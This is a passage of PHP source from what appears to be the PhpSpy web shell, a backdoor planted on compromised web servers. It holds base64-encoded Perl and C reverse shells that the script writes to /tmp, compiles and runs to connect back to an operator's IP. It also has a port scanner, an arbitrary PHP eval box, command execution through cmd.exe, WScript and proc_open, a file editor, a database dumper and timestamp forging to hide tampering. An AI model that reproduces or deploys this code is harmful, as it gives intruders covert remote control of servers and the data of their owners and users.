class=\u0026#34;head\u0026#34;\u0026gt;\u0026#39;); p(\u0026#39;\u0026lt;td width=\u0026#34;2%\u0026#34; align=\u0026#34;center\u0026#34;\u0026gt; \u0026lt;/td\u0026gt;\u0026#39;); p(\u0026#39;\u0026lt;td\u0026gt;Name\u0026lt;/td\u0026gt;\u0026#39;); p(\u0026#39;\u0026lt;td\u0026gt;Rows\u0026lt;/td\u0026gt;\u0026#39;); p(\u0026#39;\u0026lt;td\u0026gt;Data_length\u0026lt;/td\u0026gt;\u0026#39;); p(\u0026#39;\u0026lt;td\u0026gt;Create_time\u0026lt;/td\u0026gt;\u0026#39;); p(\u0026#39;\u0026lt;td\u0026gt;Update_time\u0026lt;/td\u0026gt;\u0026#39;); if ($highver) { p(\u0026#39;\u0026lt;td\u0026gt;Engine\u0026lt;/td\u0026gt;\u0026#39;); p(\u0026#39;\u0026lt;td\u0026gt;Collation\u0026lt;/td\u0026gt;\u0026#39;); } p(\u0026#39;\u0026lt;td\u0026gt;Operate\u0026lt;/td\u0026gt;\u0026#39;); p(\u0026#39;\u0026lt;/tr\u0026gt;\u0026#39;); foreach ($tabledb as $key =\u0026gt; $table) { $thisbg = bg(); p(\u0026#39;\u0026lt;tr class=\u0026#34;\u0026#39; . $thisbg . \u0026#39;\u0026#34; onmouseover=\u0026#34;this.className=\\\u0026#39;focus\\\u0026#39;;\u0026#34; onmouseout=\u0026#34;this.className=\\\u0026#39;\u0026#39; . $thisbg . \u0026#39;\\\u0026#39;;\u0026#34;\u0026gt;\u0026#39;); p(\u0026#39;\u0026lt;td align=\u0026#34;center\u0026#34; width=\u0026#34;2%\u0026#34;\u0026gt;\u0026lt;input type=\u0026#34;checkbox\u0026#34; name=\u0026#34;table[]\u0026#34; value=\u0026#34;\u0026#39; . $table[\u0026#39;Name\u0026#39;] . \u0026#39;\u0026#34; /\u0026gt;\u0026lt;/td\u0026gt;\u0026#39;); p(\u0026#39;\u0026lt;td\u0026gt;\u0026lt;a href=\u0026#34;javascript:settable(\\\u0026#39;\u0026#39; . $table[\u0026#39;Name\u0026#39;] . \u0026#39;\\\u0026#39;);\u0026#34;\u0026gt;\u0026#39; . $table[\u0026#39;Name\u0026#39;] . \u0026#39;\u0026lt;/a\u0026gt;\u0026lt;/td\u0026gt;\u0026#39;); p(\u0026#39;\u0026lt;td\u0026gt;\u0026#39; . $table[\u0026#39;Rows\u0026#39;] . \u0026#39;\u0026lt;/td\u0026gt;\u0026#39;); p(\u0026#39;\u0026lt;td\u0026gt;\u0026#39; . $table[\u0026#39;Data_length\u0026#39;] . \u0026#39;\u0026lt;/td\u0026gt;\u0026#39;); p(\u0026#39;\u0026lt;td\u0026gt;\u0026#39; . $table[\u0026#39;Create_time\u0026#39;] . \u0026#39; \u0026lt;/td\u0026gt;\u0026#39;); p(\u0026#39;\u0026lt;td\u0026gt;\u0026#39; . $table[\u0026#39;Update_time\u0026#39;] . \u0026#39; \u0026lt;/td\u0026gt;\u0026#39;); if ($highver) { p(\u0026#39;\u0026lt;td\u0026gt;\u0026#39; . $table[\u0026#39;Engine\u0026#39;] . \u0026#39;\u0026lt;/td\u0026gt;\u0026#39;); p(\u0026#39;\u0026lt;td\u0026gt;\u0026#39; . $table[\u0026#39;Collation\u0026#39;] . \u0026#39;\u0026lt;/td\u0026gt;\u0026#39;); } p(\u0026#39;\u0026lt;td\u0026gt;\u0026lt;a href=\u0026#34;javascript:settable(\\\u0026#39;\u0026#39; . $table[\u0026#39;Name\u0026#39;] . \u0026#39;\\\u0026#39;, \\\u0026#39;insert\\\u0026#39;);\u0026#34;\u0026gt;Insert\u0026lt;/a\u0026gt; | \u0026lt;a href=\u0026#34;javascript:settable(\\\u0026#39;\u0026#39; . $table[\u0026#39;Name\u0026#39;] . \u0026#39;\\\u0026#39;, \\\u0026#39;structure\\\u0026#39;);\u0026#34;\u0026gt;Structure\u0026lt;/a\u0026gt; | \u0026lt;a href=\u0026#34;javascript:settable(\\\u0026#39;\u0026#39; . $table[\u0026#39;Name\u0026#39;] . \u0026#39;\\\u0026#39;, \\\u0026#39;drop\\\u0026#39;);\u0026#34;\u0026gt;Drop\u0026lt;/a\u0026gt;\u0026lt;/td\u0026gt;\u0026#39;); p(\u0026#39;\u0026lt;/tr\u0026gt;\u0026#39;); } p(\u0026#39;\u0026lt;tr class=\u0026#34;head\u0026#34;\u0026gt;\u0026#39;); p(\u0026#39;\u0026lt;td width=\u0026#34;2%\u0026#34; align=\u0026#34;center\u0026#34;\u0026gt;\u0026lt;input name=\u0026#34;chkall\u0026#34; value=\u0026#34;on\u0026#34; type=\u0026#34;checkbox\u0026#34; onclick=\u0026#34;CheckAll(this.form)\u0026#34; /\u0026gt;\u0026lt;/td\u0026gt;\u0026#39;); p(\u0026#39;\u0026lt;td\u0026gt;Name\u0026lt;/td\u0026gt;\u0026#39;); p(\u0026#39;\u0026lt;td\u0026gt;Rows\u0026lt;/td\u0026gt;\u0026#39;); p(\u0026#39;\u0026lt;td\u0026gt;Data_length\u0026lt;/td\u0026gt;\u0026#39;); p(\u0026#39;\u0026lt;td\u0026gt;Create_time\u0026lt;/td\u0026gt;\u0026#39;); p(\u0026#39;\u0026lt;td\u0026gt;Update_time\u0026lt;/td\u0026gt;\u0026#39;); if ($highver) { p(\u0026#39;\u0026lt;td\u0026gt;Engine\u0026lt;/td\u0026gt;\u0026#39;); p(\u0026#39;\u0026lt;td\u0026gt;Collation\u0026lt;/td\u0026gt;\u0026#39;); } p(\u0026#39;\u0026lt;td\u0026gt;Operate\u0026lt;/td\u0026gt;\u0026#39;); p(\u0026#39;\u0026lt;/tr\u0026gt;\u0026#39;); p(\u0026#39;\u0026lt;tr class=\u0026#39; . bg() . \u0026#39;\u0026gt;\u0026#39;); p(\u0026#39;\u0026lt;td\u0026gt; \u0026lt;/td\u0026gt;\u0026#39;); p(\u0026#39;\u0026lt;td\u0026gt;Total tables: \u0026#39; . $table_num . \u0026#39;\u0026lt;/td\u0026gt;\u0026#39;); p(\u0026#39;\u0026lt;td\u0026gt;\u0026#39; . $table_rows . \u0026#39;\u0026lt;/td\u0026gt;\u0026#39;); p(\u0026#39;\u0026lt;td\u0026gt;\u0026#39; . $data_size . \u0026#39;\u0026lt;/td\u0026gt;\u0026#39;); p(\u0026#39;\u0026lt;td colspan=\u0026#34;\u0026#39; . ($highver ? 5 : 3) . \u0026#39;\u0026#34;\u0026gt; \u0026lt;/td\u0026gt;\u0026#39;); p(\u0026#39;\u0026lt;/tr\u0026gt;\u0026#39;); p(\u0026#34;\u0026lt;tr class=\\\u0026#34;\u0026#34; . bg() . \u0026#34;\\\u0026#34;\u0026gt;\u0026lt;td colspan=\\\u0026#34;\u0026#34; . ($highver ? 9 : 7) . \u0026#34;\\\u0026#34;\u0026gt;\u0026lt;input name=\\\u0026#34;saveasfile\\\u0026#34; value=\\\u0026#34;1\\\u0026#34; type=\\\u0026#34;checkbox\\\u0026#34; /\u0026gt; Save as file \u0026lt;input class=\\\u0026#34;input\\\u0026#34; name=\\\u0026#34;path\\\u0026#34; value=\\\u0026#34;\u0026#34; . SA_ROOT . $dbname . \u0026#34;.sql\\\u0026#34; type=\\\u0026#34;text\\\u0026#34; size=\\\u0026#34;60\\\u0026#34; /\u0026gt; \u0026lt;input class=\\\u0026#34;bt\\\u0026#34; type=\\\u0026#34;submit\\\u0026#34; value=\\\u0026#34;Export selection table\\\u0026#34; /\u0026gt;\u0026lt;/td\u0026gt;\u0026lt;/tr\u0026gt;\u0026#34;); makehide(\u0026#39;doing\u0026#39;, \u0026#39;backupmysql\u0026#39;); formfoot(); p(\u0026#34;\u0026lt;/table\u0026gt;\u0026#34;); fr($query); } } } tbfoot(); @mysql_close(); } //end mysql elseif ($action == \u0026#39;backconnect\u0026#39;) { !$yourip \u0026amp;\u0026amp; $yourip = $_SERVER[\u0026#39;REMOTE_ADDR\u0026#39;]; !$yourport \u0026amp;\u0026amp; $yourport = \u0026#39;12345\u0026#39;; $usedb = array(\u0026#39;perl\u0026#39; =\u0026gt; \u0026#39;perl\u0026#39;, \u0026#39;c\u0026#39; =\u0026gt; \u0026#39;c\u0026#39;); $back_connect = \u0026#34;IyEvdXNyL2Jpbi9wZXJsDQp1c2UgU29ja2V0Ow0KJGNtZD0gImx5bngiOw0KJHN5c3RlbT0gJ2VjaG8gImB1bmFtZSAtYWAiO2Vj\u0026#34; . \u0026#34;aG8gImBpZGAiOy9iaW4vc2gnOw0KJDA9JGNtZDsNCiR0YXJnZXQ9JEFSR1ZbMF07DQokcG9ydD0kQVJHVlsxXTsNCiRpYWRkcj1pbmV0X2F0b24oJHR\u0026#34; . \u0026#34;hcmdldCkgfHwgZGllKCJFcnJvcjogJCFcbiIpOw0KJHBhZGRyPXNvY2thZGRyX2luKCRwb3J0LCAkaWFkZHIpIHx8IGRpZSgiRXJyb3I6ICQhXG4iKT\u0026#34; . \u0026#34;sNCiRwcm90bz1nZXRwcm90b2J5bmFtZSgndGNwJyk7DQpzb2NrZXQoU09DS0VULCBQRl9JTkVULCBTT0NLX1NUUkVBTSwgJHByb3RvKSB8fCBkaWUoI\u0026#34; . \u0026#34;kVycm9yOiAkIVxuIik7DQpjb25uZWN0KFNPQ0tFVCwgJHBhZGRyKSB8fCBkaWUoIkVycm9yOiAkIVxuIik7DQpvcGVuKFNURElOLCAiPiZTT0NLRVQi\u0026#34; . \u0026#34;KTsNCm9wZW4oU1RET1VULCAiPiZTT0NLRVQiKTsNCm9wZW4oU1RERVJSLCAiPiZTT0NLRVQiKTsNCnN5c3RlbSgkc3lzdGVtKTsNCmNsb3NlKFNUREl\u0026#34; . \u0026#34;OKTsNCmNsb3NlKFNURE9VVCk7DQpjbG9zZShTVERFUlIpOw==\u0026#34;; $back_connect_c = \u0026#34;I2luY2x1ZGUgPHN0ZGlvLmg+DQojaW5jbHVkZSA8c3lzL3NvY2tldC5oPg0KI2luY2x1ZGUgPG5ldGluZXQvaW4uaD4NCmludC\u0026#34; . \u0026#34;BtYWluKGludCBhcmdjLCBjaGFyICphcmd2W10pDQp7DQogaW50IGZkOw0KIHN0cnVjdCBzb2NrYWRkcl9pbiBzaW47DQogY2hhciBybXNbMjFdPSJyb\u0026#34; . \u0026#34;SAtZiAiOyANCiBkYWVtb24oMSwwKTsNCiBzaW4uc2luX2ZhbWlseSA9IEFGX0lORVQ7DQogc2luLnNpbl9wb3J0ID0gaHRvbnMoYXRvaShhcmd2WzJd\u0026#34; . \u0026#34;KSk7DQogc2luLnNpbl9hZGRyLnNfYWRkciA9IGluZXRfYWRkcihhcmd2WzFdKTsgDQogYnplcm8oYXJndlsxXSxzdHJsZW4oYXJndlsxXSkrMStzdHJ\u0026#34; . \u0026#34;sZW4oYXJndlsyXSkpOyANCiBmZCA9IHNvY2tldChBRl9JTkVULCBTT0NLX1NUUkVBTSwgSVBQUk9UT19UQ1ApIDsgDQogaWYgKChjb25uZWN0KGZkLC\u0026#34; . \u0026#34;Aoc3RydWN0IHNvY2thZGRyICopICZzaW4sIHNpemVvZihzdHJ1Y3Qgc29ja2FkZHIpKSk8MCkgew0KICAgcGVycm9yKCJbLV0gY29ubmVjdCgpIik7D\u0026#34; . \u0026#34;QogICBleGl0KDApOw0KIH0NCiBzdHJjYXQocm1zLCBhcmd2WzBdKTsNCiBzeXN0ZW0ocm1zKTsgIA0KIGR1cDIoZmQsIDApOw0KIGR1cDIoZmQsIDEp\u0026#34; . \u0026#34;Ow0KIGR1cDIoZmQsIDIpOw0KIGV4ZWNsKCIvYmluL3NoIiwic2ggLWkiLCBOVUxMKTsNCiBjbG9zZShmZCk7IA0KfQ==\u0026#34;; if ($start \u0026amp;\u0026amp; $yourip \u0026amp;\u0026amp; $yourport \u0026amp;\u0026amp; $use) { if ($use == \u0026#39;perl\u0026#39;) { cf(\u0026#39;/tmp/angel_bc\u0026#39;, $back_connect); $res = execute(which(\u0026#39;perl\u0026#39;) . \u0026#34; /tmp/angel_bc $yourip $yourport \u0026amp;\u0026#34;); } else { cf(\u0026#39;/tmp/angel_bc.c\u0026#39;, $back_connect_c); $res = execute(\u0026#39;gcc -o /tmp/angel_bc /tmp/angel_bc.c\u0026#39;); @unlink(\u0026#39;/tmp/angel_bc.c\u0026#39;); $res = execute(\u0026#34;/tmp/angel_bc $yourip $yourport \u0026amp;\u0026#34;); } m(\u0026#34;Now script try connect to $yourip port $yourport ...\u0026#34;); } formhead(array(\u0026#39;title\u0026#39; =\u0026gt; \u0026#39;Back Connect\u0026#39;)); makehide(\u0026#39;action\u0026#39;, \u0026#39;backconnect\u0026#39;); p(\u0026#39;\u0026lt;p\u0026gt;\u0026#39;); p(\u0026#39;Your IP:\u0026#39;); makeinput(array(\u0026#39;name\u0026#39; =\u0026gt; \u0026#39;yourip\u0026#39;, \u0026#39;size\u0026#39; =\u0026gt; 20, \u0026#39;value\u0026#39; =\u0026gt; $yourip)); p(\u0026#39;Your Port:\u0026#39;); makeinput(array(\u0026#39;name\u0026#39; =\u0026gt; \u0026#39;yourport\u0026#39;, \u0026#39;size\u0026#39; =\u0026gt; 15, \u0026#39;value\u0026#39; =\u0026gt; $yourport)); p(\u0026#39;Use:\u0026#39;); makeselect(array(\u0026#39;name\u0026#39; =\u0026gt; \u0026#39;use\u0026#39;, \u0026#39;option\u0026#39; =\u0026gt; $usedb, \u0026#39;selected\u0026#39; =\u0026gt; $use)); makeinput(array(\u0026#39;name\u0026#39; =\u0026gt; \u0026#39;start\u0026#39;, \u0026#39;value\u0026#39; =\u0026gt; \u0026#39;Start\u0026#39;, \u0026#39;type\u0026#39; =\u0026gt; \u0026#39;submit\u0026#39;, \u0026#39;class\u0026#39; =\u0026gt; \u0026#39;bt\u0026#39;)); p(\u0026#39;\u0026lt;/p\u0026gt;\u0026#39;); formfoot(); } //end elseif ($action == \u0026#39;portscan\u0026#39;) { !$scanip \u0026amp;\u0026amp; $scanip = \u0026#39;127.0.0.1\u0026#39;; !$scanport \u0026amp;\u0026amp; $scanport = \u0026#39;21,25,80,110,135,139,445,1433,3306,3389,5631,43958\u0026#39;; formhead(array(\u0026#39;title\u0026#39; =\u0026gt; \u0026#39;Port Scan\u0026#39;)); makehide(\u0026#39;action\u0026#39;, \u0026#39;portscan\u0026#39;); p(\u0026#39;\u0026lt;p\u0026gt;\u0026#39;); p(\u0026#39;IP:\u0026#39;); makeinput(array(\u0026#39;name\u0026#39; =\u0026gt; \u0026#39;scanip\u0026#39;, \u0026#39;size\u0026#39; =\u0026gt; 20, \u0026#39;value\u0026#39; =\u0026gt; $scanip)); p(\u0026#39;Port:\u0026#39;); makeinput(array(\u0026#39;name\u0026#39; =\u0026gt; \u0026#39;scanport\u0026#39;, \u0026#39;size\u0026#39; =\u0026gt; 80, \u0026#39;value\u0026#39; =\u0026gt; $scanport)); makeinput(array(\u0026#39;name\u0026#39; =\u0026gt; \u0026#39;startscan\u0026#39;, \u0026#39;value\u0026#39; =\u0026gt; \u0026#39;Scan\u0026#39;, \u0026#39;type\u0026#39; =\u0026gt; \u0026#39;submit\u0026#39;, \u0026#39;class\u0026#39; =\u0026gt; \u0026#39;bt\u0026#39;)); p(\u0026#39;\u0026lt;/p\u0026gt;\u0026#39;); formfoot(); if ($startscan) { p(\u0026#39;\u0026lt;h2\u0026gt;Result »\u0026lt;/h2\u0026gt;\u0026#39;); p(\u0026#39;\u0026lt;ul class=\u0026#34;info\u0026#34;\u0026gt;\u0026#39;); foreach (explode(\u0026#39;,\u0026#39;, $scanport) as $port) { $fp = @fsockopen($scanip, $port, $errno, $errstr, 1); if (!$fp) { p(\u0026#39;\u0026lt;li\u0026gt;\u0026#39; . $scanip . \u0026#39;:\u0026#39; . $port . \u0026#39; ------------------------ \u0026lt;span style=\u0026#34;font-weight:bold;color:#f00;\u0026#34;\u0026gt;Close\u0026lt;/span\u0026gt;\u0026lt;/li\u0026gt;\u0026#39;); } else { p(\u0026#39;\u0026lt;li\u0026gt;\u0026#39; . $scanip . \u0026#39;:\u0026#39; . $port . \u0026#39; ------------------------ \u0026lt;span style=\u0026#34;font-weight:bold;color:#080;\u0026#34;\u0026gt;Open\u0026lt;/span\u0026gt;\u0026lt;/li\u0026gt;\u0026#39;); @fclose($fp); } } p(\u0026#39;\u0026lt;/ul\u0026gt;\u0026#39;); } } elseif ($action == \u0026#39;eval\u0026#39;) { $phpcode = trim($phpcode); if ($phpcode) { if (!preg_match(\u0026#39;#\u0026lt;\\?#si\u0026#39;, $phpcode)) { $phpcode = \u0026#34;\u0026lt;?php\\n\\n{$phpcode}\\n\\n?\u0026gt;\u0026#34;; } eval(\u0026#34;?\u0026#34; . \u0026#34;\u0026gt;$phpcode\u0026lt;?\u0026#34;); } formhead(array(\u0026#39;title\u0026#39; =\u0026gt; \u0026#39;Eval PHP Code\u0026#39;)); makehide(\u0026#39;action\u0026#39;, \u0026#39;eval\u0026#39;); maketext(array(\u0026#39;title\u0026#39; =\u0026gt; \u0026#39;PHP Code\u0026#39;, \u0026#39;name\u0026#39; =\u0026gt; \u0026#39;phpcode\u0026#39;, \u0026#39;value\u0026#39; =\u0026gt; $phpcode)); p(\u0026#39;\u0026lt;p\u0026gt;\u0026lt;a href=\u0026#34;http://w\u0026#39; . \u0026#39;ww.4ng\u0026#39; . \u0026#39;el.net/php\u0026#39; . \u0026#39;spy/pl\u0026#39; . \u0026#39;ugin/\u0026#34; target=\u0026#34;_blank\u0026#34;\u0026gt;Get plugins\u0026lt;/a\u0026gt;\u0026lt;/p\u0026gt;\u0026#39;); formfooter(); } //end eval elseif ($action == \u0026#39;editfile\u0026#39;) { if (file_exists($opfile)) { $fp = @fopen($opfile, \u0026#39;r\u0026#39;); $contents = @fread($fp, filesize($opfile)); @fclose($fp); $contents = htmlspecialchars($contents); } formhead(array(\u0026#39;title\u0026#39; =\u0026gt; \u0026#39;Create / Edit File\u0026#39;)); makehide(\u0026#39;action\u0026#39;, \u0026#39;file\u0026#39;); makehide(\u0026#39;dir\u0026#39;, $nowpath); makeinput(array(\u0026#39;title\u0026#39; =\u0026gt; \u0026#39;Current File (import new file name and new file)\u0026#39;, \u0026#39;name\u0026#39; =\u0026gt; \u0026#39;editfilename\u0026#39;, \u0026#39;value\u0026#39; =\u0026gt; $opfile, \u0026#39;newline\u0026#39; =\u0026gt; 1)); maketext(array(\u0026#39;title\u0026#39; =\u0026gt; \u0026#39;File Content\u0026#39;, \u0026#39;name\u0026#39; =\u0026gt; \u0026#39;filecontent\u0026#39;, \u0026#39;value\u0026#39; =\u0026gt; $contents)); formfooter(); goback(); } //end editfile elseif ($action == \u0026#39;newtime\u0026#39;) { $opfilemtime = @filemtime($opfile); //$time = strtotime(\u0026#34;$year-$month-$day $hour:$minute:$second\u0026#34;); $cachemonth = array(\u0026#39;January\u0026#39; =\u0026gt; 1, \u0026#39;February\u0026#39; =\u0026gt; 2, \u0026#39;March\u0026#39; =\u0026gt; 3, \u0026#39;April\u0026#39; =\u0026gt; 4, \u0026#39;May\u0026#39; =\u0026gt; 5, \u0026#39;June\u0026#39; =\u0026gt; 6, \u0026#39;July\u0026#39; =\u0026gt; 7, \u0026#39;August\u0026#39; =\u0026gt; 8, \u0026#39;September\u0026#39; =\u0026gt; 9, \u0026#39;October\u0026#39; =\u0026gt; 10, \u0026#39;November\u0026#39; =\u0026gt; 11, \u0026#39;December\u0026#39; =\u0026gt; 12); formhead(array(\u0026#39;title\u0026#39; =\u0026gt; \u0026#39;Clone folder/file was last modified time\u0026#39;)); makehide(\u0026#39;action\u0026#39;, \u0026#39;file\u0026#39;); makehide(\u0026#39;dir\u0026#39;, $nowpath); makeinput(array(\u0026#39;title\u0026#39; =\u0026gt; \u0026#39;Alter folder/file\u0026#39;, \u0026#39;name\u0026#39; =\u0026gt; \u0026#39;curfile\u0026#39;, \u0026#39;value\u0026#39; =\u0026gt; $opfile, \u0026#39;size\u0026#39; =\u0026gt; 120, \u0026#39;newline\u0026#39; =\u0026gt; 1)); makeinput(array(\u0026#39;title\u0026#39; =\u0026gt; \u0026#39;Reference folder/file (fullpath)\u0026#39;, \u0026#39;name\u0026#39; =\u0026gt; \u0026#39;tarfile\u0026#39;, \u0026#39;size\u0026#39; =\u0026gt; 120, \u0026#39;newline\u0026#39; =\u0026gt; 1)); formfooter(); formhead(array(\u0026#39;title\u0026#39; =\u0026gt; \u0026#39;Set last modified\u0026#39;)); makehide(\u0026#39;action\u0026#39;, \u0026#39;file\u0026#39;); makehide(\u0026#39;dir\u0026#39;, $nowpath); makeinput(array(\u0026#39;title\u0026#39; =\u0026gt; \u0026#39;Current folder/file (fullpath)\u0026#39;, \u0026#39;name\u0026#39; =\u0026gt; \u0026#39;curfile\u0026#39;, \u0026#39;value\u0026#39; =\u0026gt; $opfile, \u0026#39;size\u0026#39; =\u0026gt; 120, \u0026#39;newline\u0026#39; =\u0026gt; 1)); p(\u0026#39;\u0026lt;p\u0026gt;year:\u0026#39;); makeinput(array(\u0026#39;name\u0026#39; =\u0026gt; \u0026#39;year\u0026#39;, \u0026#39;value\u0026#39; =\u0026gt; date(\u0026#39;Y\u0026#39;, $opfilemtime), \u0026#39;size\u0026#39; =\u0026gt; 4)); p(\u0026#39;month:\u0026#39;); makeinput(array(\u0026#39;name\u0026#39; =\u0026gt; \u0026#39;month\u0026#39;, \u0026#39;value\u0026#39; =\u0026gt; date(\u0026#39;m\u0026#39;, $opfilemtime), \u0026#39;size\u0026#39; =\u0026gt; 2)); p(\u0026#39;day:\u0026#39;); makeinput(array(\u0026#39;name\u0026#39; =\u0026gt; \u0026#39;day\u0026#39;, \u0026#39;value\u0026#39; =\u0026gt; date(\u0026#39;d\u0026#39;, $opfilemtime), \u0026#39;size\u0026#39; =\u0026gt; 2)); p(\u0026#39;hour:\u0026#39;); makeinput(array(\u0026#39;name\u0026#39; =\u0026gt; \u0026#39;hour\u0026#39;, \u0026#39;value\u0026#39; =\u0026gt; date(\u0026#39;H\u0026#39;, $opfilemtime), \u0026#39;size\u0026#39; =\u0026gt; 2)); p(\u0026#39;minute:\u0026#39;); makeinput(array(\u0026#39;name\u0026#39; =\u0026gt; \u0026#39;minute\u0026#39;, \u0026#39;value\u0026#39; =\u0026gt; date(\u0026#39;i\u0026#39;, $opfilemtime), \u0026#39;size\u0026#39; =\u0026gt; 2)); p(\u0026#39;second:\u0026#39;); makeinput(array(\u0026#39;name\u0026#39; =\u0026gt; \u0026#39;second\u0026#39;, \u0026#39;value\u0026#39; =\u0026gt; date(\u0026#39;s\u0026#39;, $opfilemtime), \u0026#39;size\u0026#39; =\u0026gt; 2)); p(\u0026#39;\u0026lt;/p\u0026gt;\u0026#39;); formfooter(); goback(); } //end newtime elseif ($action == \u0026#39;shell\u0026#39;) { if (IS_WIN \u0026amp;\u0026amp; IS_COM) { if ($program \u0026amp;\u0026amp; $parameter) { $shell = new COM(\u0026#39;Shell.Application\u0026#39;); $a = $shell-\u0026gt;ShellExecute($program, $parameter); m(\u0026#39;Program run has \u0026#39; . (!$a ? \u0026#39;success\u0026#39; : \u0026#39;fail\u0026#39;)); } !$program \u0026amp;\u0026amp; $program = \u0026#39;c:\\windows\\system32\\cmd.exe\u0026#39;; !$parameter \u0026amp;\u0026amp; $parameter = \u0026#39;/c net start \u0026gt; \u0026#39; . SA_ROOT . \u0026#39;log.txt\u0026#39;; formhead(array(\u0026#39;title\u0026#39; =\u0026gt; \u0026#39;Execute Program\u0026#39;)); makehide(\u0026#39;action\u0026#39;, \u0026#39;shell\u0026#39;); makeinput(array(\u0026#39;title\u0026#39; =\u0026gt; \u0026#39;Program\u0026#39;, \u0026#39;name\u0026#39; =\u0026gt; \u0026#39;program\u0026#39;, \u0026#39;value\u0026#39; =\u0026gt; $program, \u0026#39;newline\u0026#39; =\u0026gt; 1)); p(\u0026#39;\u0026lt;p\u0026gt;\u0026#39;); makeinput(array(\u0026#39;title\u0026#39; =\u0026gt; \u0026#39;Parameter\u0026#39;, \u0026#39;name\u0026#39; =\u0026gt; \u0026#39;parameter\u0026#39;, \u0026#39;value\u0026#39; =\u0026gt; $parameter)); makeinput(array(\u0026#39;name\u0026#39; =\u0026gt; \u0026#39;submit\u0026#39;, \u0026#39;class\u0026#39; =\u0026gt; \u0026#39;bt\u0026#39;, \u0026#39;type\u0026#39; =\u0026gt; \u0026#39;submit\u0026#39;, \u0026#39;value\u0026#39; =\u0026gt; \u0026#39;Execute\u0026#39;)); p(\u0026#39;\u0026lt;/p\u0026gt;\u0026#39;); formfoot(); } formhead(array(\u0026#39;title\u0026#39; =\u0026gt; \u0026#39;Execute Command\u0026#39;)); makehide(\u0026#39;action\u0026#39;, \u0026#39;shell\u0026#39;); if (IS_WIN \u0026amp;\u0026amp; IS_COM) { $execfuncdb = array(\u0026#39;phpfunc\u0026#39; =\u0026gt; \u0026#39;phpfunc\u0026#39;, \u0026#39;wscript\u0026#39; =\u0026gt; \u0026#39;wscript\u0026#39;, \u0026#39;proc_open\u0026#39; =\u0026gt; \u0026#39;proc_open\u0026#39;); makeselect(array(\u0026#39;title\u0026#39; =\u0026gt; \u0026#39;Use:\u0026#39;, \u0026#39;name\u0026#39; =\u0026gt; \u0026#39;execfunc\u0026#39;, \u0026#39;option\u0026#39; =\u0026gt; $execfuncdb, \u0026#39;selected\u0026#39; =\u0026gt; $execfunc, \u0026#39;newline\u0026#39; =\u0026gt; 1)); } p(\u0026#39;\u0026lt;p\u0026gt;\u0026#39;); makeinput(array(\u0026#39;title\u0026#39; =\u0026gt; \u0026#39;Command\u0026#39;, \u0026#39;name\u0026#39; =\u0026gt; \u0026#39;command\u0026#39;, \u0026#39;value\u0026#39; =\u0026gt; htmlspecialchars($command))); makeinput(array(\u0026#39;name\u0026#39; =\u0026gt; \u0026#39;submit\u0026#39;, \u0026#39;class\u0026#39; =\u0026gt; \u0026#39;bt\u0026#39;, \u0026#39;type\u0026#39; =\u0026gt; \u0026#39;submit\u0026#39;, \u0026#39;value\u0026#39; =\u0026gt; \u0026#39;Execute\u0026#39;)); p(\u0026#39;\u0026lt;/p\u0026gt;\u0026#39;); formfoot(); if ($command) { p(\u0026#39;\u0026lt;hr width=\u0026#34;100%\u0026#34; noshade /\u0026gt;\u0026lt;pre\u0026gt;\u0026#39;); if ($execfunc == \u0026#39;wscript\u0026#39; \u0026amp;\u0026amp; IS_WIN \u0026amp;\u0026amp; IS_COM) { $wsh = new COM(\u0026#39;WScript.shell\u0026#39;); $exec = $wsh-\u0026gt;exec(\u0026#39;cmd.exe /c \u0026#39; . $command); $stdout = $exec-\u0026gt;StdOut(); $stroutput = $stdout-\u0026gt;ReadAll(); echo $stroutput; } elseif ($execfunc == \u0026#39;proc_open\u0026#39; \u0026amp;\u0026amp; IS_WIN \u0026amp;\u0026amp; IS_COM) { $descriptorspec = array( 0 =\u0026gt; array(\u0026#39;pipe\u0026#39;, \u0026#39;r\u0026#39;), 1 =\u0026gt; array(\u0026#39;pipe\u0026#39;, \u0026#39;w\u0026#39;), 2 =\u0026gt; array(\u0026#39;pipe\u0026#39;, \u0026#39;w\u0026#39;) ); $process = proc_open($_SERVER[\u0026#39;COMSPEC\u0026#39;], $descriptorspec, $pipes); if (is_resource($process)) { fwrite($pipes[0], $command . \u0026#34;\\r\\n\u0026#34;); fwrite($pipes[0], \u0026#34;exit\\r\\n\u0026#34;); fclose($pipes[0]); while (!feof($pipes[1])) { echo fgets($pipes[1], 1024); } fclose($pipes[1]); while (!feof($pipes[2])) { echo fgets($pipes[2], 1024); } fclose($pipes[2]); proc_close($process); } } else { echo (execute($command)); } p(\u0026#39;\u0026lt;/pre\u0026gt;\u0026#39;); } } //end shell elseif ($action == \u0026#39;phpenv\u0026#39;) { $upsize = getcfg(\u0026#39;file_uploads\u0026#39;) ? getcfg(\u0026#39;upload_max_filesize\u0026#39;) : \u0026#39;Not allowed\u0026#39;; $adminmail = isset($_SERVER[\u0026#39;SERVER_ADMIN\u0026#39;]) ? $_SERVER[\u0026#39;SERVER_ADMIN\u0026#39;] : getcfg(\u0026#39;sendmail_from\u0026#39;); !$dis_func \u0026amp;\u0026amp; $dis_func = \u0026#39;No\u0026#39;; $info = array( 1 =\u0026gt; array(\u0026#39;Server Time\u0026#39;, date(\u0026#39;Y/m/d h:i:s\u0026#39;, $timestamp)), 2 =\u0026gt; array(\u0026#39;Server Domain\u0026#39;, $_SERVER[\u0026#39;SERVER_NAME\u0026#39;]), 3 =\u0026gt; array(\u0026#39;Server IP\u0026#39;, gethostbyname($_SERVER[\u0026#39;SERVER_NAME\u0026#39;])), 4 =\u0026gt; array(\u0026#39;Server OS\u0026#39;, PHP_OS), 5 =\u0026gt; array(\u0026#39;Server OS Charset\u0026#39;, $_SERVER[\u0026#39;HTTP_ACCEPT_LANGUAGE\u0026#39;]), 6 =\u0026gt; array(\u0026#39;Server Software\u0026#39;, $_SERVER[\u0026#39;SERVER_SOFTWARE\u0026#39;]), 7 =\u0026gt; array(\u0026#39;Server Web Port\u0026#39;, $_SERVER[\u0026#39;SERVER_PORT\u0026#39;]), 8 =\u0026gt; array(\u0026#39;PHP run mode\u0026#39;, strtoupper(php_sapi_name())), 9 =\u0026gt; array(\u0026#39;The file path\u0026#39;, __FILE__), 10 =\u0026gt; array(\u0026#39;PHP Version\u0026#39;, PHP_VERSION), 11 =\u0026gt; array(\u0026#39;PHPINFO\u0026#39;, (IS_PHPINFO ? \u0026#39;\u0026lt;a href=\u0026#34;javascript:g(\\\u0026#39;phpinfo\\\u0026#39;);\u0026#34;\u0026gt;Yes\u0026lt;/a\u0026gt;\u0026#39; : \u0026#39;No\u0026#39;)), 12 =\u0026gt; array(\u0026#39;Safe Mode\u0026#39;, getcfg(\u0026#39;safe_mode\u0026#39;)), 13 =\u0026gt; 